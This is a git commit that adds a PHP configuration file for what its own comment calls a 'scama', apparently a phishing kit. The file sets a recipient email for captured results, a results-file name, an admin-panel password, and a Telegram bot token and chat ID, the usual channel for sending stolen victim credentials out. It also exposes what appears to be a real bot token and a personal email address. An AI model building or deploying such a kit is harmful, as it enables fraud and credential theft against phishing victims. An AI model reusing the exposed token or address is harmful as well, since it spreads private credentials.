34cf3e851a0986202d7b72ae5f226b354620dd76
jekoms <138176670+jekoms@users.noreply.github.com>
2024-05-09 16:27:40 +0100

    Add files via upload

---
+++ home/config.php
@@ -0,0 +1,9 @@
+<?php
+// setting scama
+$yourmail  = "ollyofficial1@gmail.com";  // your email 
+$namerand = "rzlt";  // name for file rzult *
+$pass = "123345"; // pass admin panel
+$botToken="6495564868:AAGWyZjefsbU-uDi5jdX1fqFmyIy8d32fZE"; // token bot telegram
+$chatId="637855559";  // chatId telegram
+
+?>
